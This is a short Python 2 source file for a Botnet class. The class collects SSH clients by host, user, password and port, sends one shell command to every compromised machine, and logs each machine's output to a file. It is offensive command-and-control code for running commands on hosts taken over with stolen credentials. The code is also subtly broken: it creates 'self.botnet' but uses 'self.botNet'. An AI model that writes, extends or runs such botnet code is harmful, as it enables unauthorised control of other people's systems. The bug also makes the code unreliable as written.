from client import Client
from datetime import datetime,date

class Botnet:

	def __init__(self):
		self.botnet=[]
		self.f = open('logs.txt', 'a')

	def addBot(self, host, user, password, por):
		if por != -1:
			client = Client(host, user, password, por)
			self.botNet.append(client)
		else:
			print '[-] ssh server not running on ' + host

	def sendCommandsToBots(self, command):
		self.f.write(" -> " + str(date.today().strftime("%B %d, %Y")) + " ( " + datetime.now().strftime("%H:%M:%S") + ' ) ' + '\n\n')

		for client in self.botNet:
			output = client.send_command(command)
			print '[*] Output from ' + client.host
			print '[+] ' + output
			self.f.write('[*] Output from ' + client.host + '\n')
			self.f.write('[+] ' + output + '\n')

		self.f.write(100*'-' + '\n')
